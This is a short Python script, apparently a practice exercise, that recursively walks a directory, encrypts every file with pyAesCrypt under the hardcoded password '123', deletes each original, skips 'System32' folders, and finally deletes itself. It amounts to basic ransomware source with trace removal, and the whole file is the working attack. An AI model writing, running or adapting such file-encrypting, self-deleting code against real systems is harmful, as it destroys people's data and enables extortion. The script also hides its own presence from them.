import os
import sys


def crypt(file):
    import pyAesCrypt
    print("---------------------------------------------------------------")
    password = "123"
    buffer_size = 512*1024
    pyAesCrypt.encryptFile(str(file), str(file)+".crp", password, buffer_size)
    print("[crypted] '"+str(file)+".crp'")
    os.remove(file)
    

def walk(directory):
    for name in os.listdir(directory):
        if name != 'System32':
            path = os.path.join(directory, name)
            if os.path.isfile(path):
                crypt(path)
            else:
                walk(path)
                
                
walk("/home/dmytrotsko/Desktop/underdefence_practice/task_6")
os.remove(str(sys.argv[0]))